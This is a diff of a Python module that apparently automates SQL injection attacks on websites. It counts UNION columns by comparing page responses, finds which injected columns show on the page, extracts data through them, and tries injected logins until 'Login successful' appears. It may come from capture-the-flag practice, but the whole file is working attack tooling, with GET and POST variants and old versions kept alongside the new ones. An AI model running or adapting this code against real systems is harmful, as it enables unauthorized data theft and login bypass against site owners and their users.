@@ -6,7 +6,7 @@ from connect import my_request as req
 
 
 def find_error(url: str, param: str, cook: dict) -> str:
-    html_responce = req.my_request(url, param, cook).replace(
+    html_responce = req.get_request(url, param, cook).replace(
         '<b>', '').replace('</b>', '').replace('\n', '')
     soup = BeautifulSoup(html_responce, 'html.parser')
     war = soup.find_all(string=re.compile("Warning"))
@@ -17,7 +17,7 @@ def none_func(s: str) -> str:
     return s
 
 
-def count_columns(url: str, payload: str, p: str, cook={}, encode=none_func) -> int:
+def count_columns(url: str, data: dict, cook={}, encode=none_func, method='get') -> int:
     '''
     Counting the number of columns that must be passed in the request 
     for a successful call.
@@ -31,43 +31,109 @@ def count_columns(url: str, payload: str, p: str, cook={}, encode=none_func) -> 
 
     max_columns = 30
     html_responce_1 = ''
+    payload = [(k, v) for k, v in data.items() if '%' in v]
+    # ToDo for multiply %
     for i in range(1, max_columns):
-        pl = payload % str(i)
+        pl = payload[0][1] % str(i)
         if encode != none_func:
             print(pl)
-        param = {p: encode(pl)}
-        html_responce_2 = req.get_request(url, param, cook)
+            pl = encode(pl)
+        data[payload[0][0]] = pl
+
+        if method == 'get':
+            html_responce_2 = req.get_request(url, data, cook)
+        elif method == 'post':
+            html_responce_2 = req.post_request(url, data, cook)
+        else:
+            print('request method is not understanding')
+            return False
+
         for s in difflib.ndiff(html_responce_2, html_responce_1):
             if i > 1 and ('+' in s[0] or '-' in s[0]):
+                print('num of columns: ', i - 1)
                 return i - 1
             html_responce_1 = html_responce_2
+
     print('num of columns not find')
-    exit(1)
+    return False
 
 
-def find_visible_columns(url: str, list_columns: list,
-                         payload: dict, cook={}, method='get') -> list:
+def find_visible_columns(url: str, columns: int, payload: str, p: str, finds: list,
+                         cook={}, encode=none_func, method='get') -> list:
     '''
     The function finds the columns displayed on the web page after request.
     '''
 
-    html_visible = req.my_request(url, payload, cook, method, 0, 1)
-    list_of_visible = [text for text in list_columns if text in html_visible]
+    list_of_columns = [str(c + 1) * 3 for c in range(columns)]
+    print('list of columns: ', list_of_columns)
+    pl = payload % (','.join(list_of_columns))
+    if encode != none_func:
+        print(pl)
+    param = {p: encode(pl)}
+
+    if method == 'get':
+        html_visible = req.get_request(url, param, cook)
+    elif method == 'post':
+        html_visible = req.post_request(url, param, cook)
+    else:
+        print('request method is not understanding')
+        return False
+
+    list_of_visible = [
+        text for text in list_of_columns if text in html_visible]
 
     if not list_of_visible:
         print('not find visible column')
         exit(1)
     print('visible columns: ', list_of_visible)
-    return [list_of_visible, html_visible]
+
+    # find param
+    keys = []
+    for field in finds:
+        list_of_columns[int(list_of_visible[0][0]) - 1] = field
+        pl = payload % (','.join(list_of_columns))
+        if encode != none_func:
+            print(pl)
+        param = {p: encode(pl)}
+
+        if method == 'get':
+            html_response = req.get_request(url, param, cook)
+        elif method == 'post':
+            html_response = req.post_request(url, param, cook)
+        else:
+            print('request method is not understanding')
+            return False
+
+        # Find differens
+        index = 0
+        key = []
+        while html_response[index] == html_visible[index]:
+            index += 1
+        new_index = index
+        # + 3 because 111,222 etc in request
+        while html_response[new_index] != html_visible[index + 3]:
+            key.append(html_response[new_index])
+            new_index += 1
+        print('key: ', ''.join(key))
+        keys.append(''.join(key))
+
+    return keys
 
 
-def find_param(url: str, html_visible: str,
-               payload: dict, cook={}, method='get') -> list:
+def find_param(url: str, columns: int, field: str, list_of_visible: list, html_visible: str,
+               payload: str, p: str, cook={}, encode=none_func) -> list:
     '''
     The function finds desired data in visible columns in the response.
     '''
 
-    html_response = req.my_request(url, payload, cook, method, 0, 1)
+    list_of_columns = [str(c + 1) * 3 for c in range(columns)]
+    list_of_columns[int(list_of_visible[0][0]) - 1] = field
+    pl = payload % (','.join(list_of_columns))
+    if encode != none_func:
+        print(pl)
+    param = {p: encode(pl)}
+
+    html_response = req.get_request(url, param, cook)
 
     # Find differens
     index = 0
@@ -113,26 +179,26 @@ def find_column_position(url: str, list_of_columns: list, payload: str,
     exit(1)
 
 
-def try_auth(url: str, list_of_columns: list, data: str,
-             p: str, finds: str, cook={}) -> str:
+def try_auth(url: str, columns: int, data: str,
+             finds: str, cook={}) -> str:
     '''
     Тry to log in if we know the number of columns and what we write in them.
     '''
-    max_rows = 10
-    m_row = 0
-    index_m_row = 0
-    for i in range(len(list_of_columns)):
+    list_of_columns = [str(c + 1) * 3 for c in range(columns)]
+    payload = [(k, v) for k, v in data.items() if '%' in v]
+    for i in range(columns):
         data_dict = data.copy()
         tmp = list_of_columns[i]
         list_of_columns[i] = finds
-        data_dict['username'] = data_dict['username'] % ','.join(
-            list_of_columns)
-        response = req.post_request(url + p, data_dict, cook)
+        pl = payload[0][1] % (','.join(list_of_columns))
+        data_dict[payload[0][0]] = pl
+
+        response = req.post_request(url, data_dict, cook)
         if 'Login successful' in response:
             return response
         list_of_columns[i] = tmp
     print('auth not success')
-    exit(1)
+    return False
 
 
 def find_key_len(url: str, payload: str,
@@ -183,3 +249,79 @@ def save_cookies(cooks: dict):
     except:
         print('can not write cookies')
         exit(1)
+
+
+def find_visible_columns_old(url: str, list_columns: list,
+                             payload: dict, cook={}, method='get') -> list:
+    '''
+    The function finds the columns displayed on the web page after request.
+    '''
+
+    html_visible = req.my_request(url, payload, cook, method, 0, 1)
+    list_of_visible = [text for text in list_columns if text in html_visible]
+
+    if not list_of_visible:
+        print('not find visible column')
+        exit(1)
+    print('visible columns: ', list_of_visible)
+    return [list_of_visible, html_visible]
+
+
+def find_param_old(url: str, html_visible: str,
+                   payload: dict, cook={}, method='get') -> list:
+    '''
+    The function finds desired data in visible columns in the response.
+    '''
+
+    html_response = req.my_request(url, payload, cook, method, 0, 1)
+
+    # Find differens
+    index = 0
+    key = []
+    while html_response[index] == html_visible[index]:
+        index += 1
+    new_index = index
+    # because 111,222 etc in request
+    while html_response[new_index] != html_visible[index + 3]:
+        key.append(html_response[new_index])
+        new_index += 1
+    print('key: ', ''.join(key))
+
+    return ''.join(key)
+
+
+def count_columns_old(url: str, payload: str, p: str, cook={}, encode=none_func, method='get') -> int:
+    '''
+    Counting the number of columns that must be passed in the request 
+    for a successful call.
+    The request is transmitted via get (param), the response is the content of the web page.
+    Тhe function compares responses from two consecutive requests 
+    and checks the difference in them.
+
+    max_columns: еstimated maximum number of columns
+    html_responce_1, html_responce_2: response from the web page
+    '''
+
+    max_columns = 30
+    html_responce_1 = ''
+    for i in range(1, max_columns):
+        pl = payload % str(i)
+        if encode != none_func:
+            print(pl)
+        param = {p: encode(pl)}
+
+        if method == 'get':
+            html_responce_2 = req.get_request(url, param, cook)
+        elif method == 'post':
+            html_responce_2 = req.post_request(url, param, cook)
+        else:
+            print('request method is not understanding')
+            return False
+
+        for s in difflib.ndiff(html_responce_2, html_responce_1):
+            if i > 1 and ('+' in s[0] or '-' in s[0]):
+                return i - 1
+            html_responce_1 = html_responce_2
+
+    print('num of columns not find')
+    return False
